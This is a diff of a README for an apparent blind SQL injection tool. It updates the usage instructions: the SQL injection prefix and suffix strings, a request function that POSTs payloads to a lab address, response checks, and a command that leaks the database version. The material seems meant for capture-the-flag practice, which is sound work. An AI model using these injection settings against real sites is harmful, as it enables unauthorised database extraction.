@@ -9,29 +9,33 @@
 - Supports multiple types of databases _(MSSQL only supports Boolean based)_
 
 ## Usage
-Set the database and SQLi type, the strings that go before and after the query and the sleep time if Time based if being used
+You can set strings that go before and after the query and the sleep time if Time based if being used
 ```python
-database = DBType.PostgreSQL
-sqlitype = SQLiType.Boolean
-PRE = "' or"
-POST = '-- -'
+PRE = "' OR"
+POST = '--'
 sleep_time = 2
 ```
 Re-define the `send_req` function.
 ```python
 def send_req(payload):
-    # print(payload)
-    params = {'pwn': payload}
+    #print(payload)
+    params = {}
     cookies = {}
+    headers = {}
+    data = {'pwn': payload}
     proxies = {}
     # proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
     url = 'http://10.10.10.10/index.php'
-    r = requests.get(url,
-                     params=params,
-                     verify=False,
-                     proxies=proxies,
-                     allow_redirects=False,
-                     cookies=cookies)
+    r = requests.post(
+        url,
+        params=params,
+        data=data,
+        headers=headers,
+        verify=False,
+        proxies=proxies,
+        allow_redirects=False,
+        cookies=cookies
+    )
     return r
 ```
 Optionally, you might want to re-define the `check_if_true` function to customize the detection of "true" and "false" queries.  
@@ -44,7 +48,12 @@ def check_if_true(r, time_elapsed):
         return int(r.headers['Content-Length']) == compare_value
 ```
 
+Finally, run it specifying the database type, the SQL injection type and the query.
+```bash
+./MySQLi.py --database mysql --type boolean --query "select version() as leak"
+```
+
 ## TODO
 - Add Time based to MSSQL
 - Add more DBs
-- Add threads?
+- Add threads
